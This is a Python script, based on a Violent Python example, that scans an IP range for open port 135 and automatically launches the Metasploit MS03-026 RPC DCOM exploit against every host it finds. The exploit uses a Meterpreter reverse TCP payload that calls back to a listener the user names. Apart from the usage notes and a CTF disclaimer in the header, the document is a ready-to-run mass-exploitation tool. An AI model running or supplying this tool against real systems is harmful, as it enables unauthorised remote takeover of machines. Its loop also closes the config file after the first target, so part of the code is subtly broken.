'''
The following program is based off the conficker.py example in TJ O'Conner's bookViolent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and
Security Engineers and is intended to run on Kali Linux.  The program initiates an nmap scan on the IP range provided by the user, checks to see if port 135 is open,
and if so launches the Metasploit module Microsoft RPC DCOM Interface Overflow (MS 03-026) and uses a meterpreter shell initiated by a reverse tcp connection as the payload.
More information on the vulnerability can be found here: http://www.rapid7.com/db/modules/exploit/windows/dcerpc/ms03_026_dcom

Usage from the terminal: python rpcdcom.py -H [target address(es)] -l [listen address] -p [listen port]

After running active seesions can be viewed by entering, show sessions, to the command line.  Sessons can be interacted with by entering,
sessions -i [session number]

Entering help or -h in a meterpeter session will provide a list of commands.

I, Lars Cohenour, the author of this book, and publisher do not take any responsibility for any damages that may occur while running this code.  It is to be used
in a CTF Red Team environment.  Do not run on any critical systems or systems in production, use at your own risk. 


'''


import os
import optparse
import sys
import nmap

def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '135')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(135):
            state =nmScan[host]['tcp'][135]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts
def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+\
        'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')
def rpcDcomExploit(configFile, lhost, lport, tgtHost):
    configFile.write('use exploit/windows/dcerpc/ms03_026_dcom\n')
    configFile.write('set payload '+\
        'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set ExitOnSession false\n')
    configFile.write('exploit\n')
def main():
    configFile = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog '+\
        '-H <RHOST[s]> -l <LHOST > [-p <LPORT>]')
    parser.add_option('-H', dest='tgtHost', type='string', \
        help='specify the target address[es]')
    parser.add_option('-p', dest ='lport', type='string', \
        help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string', \
        help='specify the listen address')
    (options, args) = parser.parse_args()
    if (options.tgtHost == None) | (options.lhost == None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '4444'
    tgtHosts = findTgts(options.tgtHost)
    setupHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        rpcDcomExploit(configFile, lhost, lport, tgtHost)
        configFile.close()
        os.system('msfconsole -r meta.rc')
if __name__ == '__main__':
    main()
